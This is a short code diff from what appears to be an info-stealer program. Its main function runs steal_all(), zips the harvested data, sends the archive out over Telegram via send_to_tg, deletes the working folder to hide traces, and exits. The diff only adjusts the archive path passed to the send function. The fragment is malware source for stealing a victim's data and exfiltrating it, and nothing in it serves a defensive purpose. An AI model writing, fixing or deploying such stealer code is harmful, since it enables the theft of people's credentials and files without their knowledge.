@@ -28,8 +28,7 @@ def main():
     stealer.steal_all()
     arch = stealer.create_zip_archive()
     if arch:
-        archive = os.path.join(stealer.FILE_PATH, stealer.ZIP_PATH)
-        send_to_tg(archive)
+        send_to_tg(stealer.ZIP_PATH)
         stealer.delFolder()
         bot.stop_polling()
         exit(0)
